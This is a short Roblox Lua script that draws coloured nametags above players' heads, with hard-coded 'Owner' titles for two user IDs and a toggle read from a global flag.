-- [[ NAMETAG LOGIC ]] --
local CustomSlots = {
    [879202] = {Title = "Owner", Color = "Rainbow"},
    [1152389] = {Title = "Owner", Color = Color3.fromRGB(0, 255, 0)}
}

local function applyTags(p)
    p.CharacterAdded:Connect(function(char)
        local head = char:WaitForChild("Head", 10)
        if not head then return end
        
        local bill = Instance.new("BillboardGui", head)
        bill.Name = "PlutoTag"
        bill.Size = UDim2.new(0, 200, 0, 50)
        bill.StudsOffset = Vector3.new(0, 3, 0)
        bill.AlwaysOnTop = true
        
        local lbl = Instance.new("TextLabel", bill)
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.TextStrokeTransparency = 0
        lbl.TextScaled = true
        lbl.Font = Enum.Font.GothamBold
        
        local config = CustomSlots[p.UserId]
        if config then
            if config.Color == "Rainbow" then
                task.spawn(function()
                    while lbl do
                        for i = 0, 1, 0.01 do
                            if not lbl then break end
                            lbl.TextColor3 = Color3.fromHSV(i, 1, 1)
                            task.wait(0.05)
                        end
                    end
                end)
            else
                lbl.TextColor3 = config.Color
            end
        else
            lbl.TextColor3 = Color3.fromRGB(123, 44, 191) -- Purple
        end
        
        task.spawn(function()
            while char:IsDescendantOf(workspace) do
                if getgenv().NametagsEnabled then
                    local displayTitle = config and config.Title or "Player"
                    lbl.Text = p.DisplayName .. " [" .. displayTitle .. "]"
                    lbl.Visible = true
                else
                    lbl.Visible = false
                end
                task.wait(0.5)
            end
        end)
    end)
end

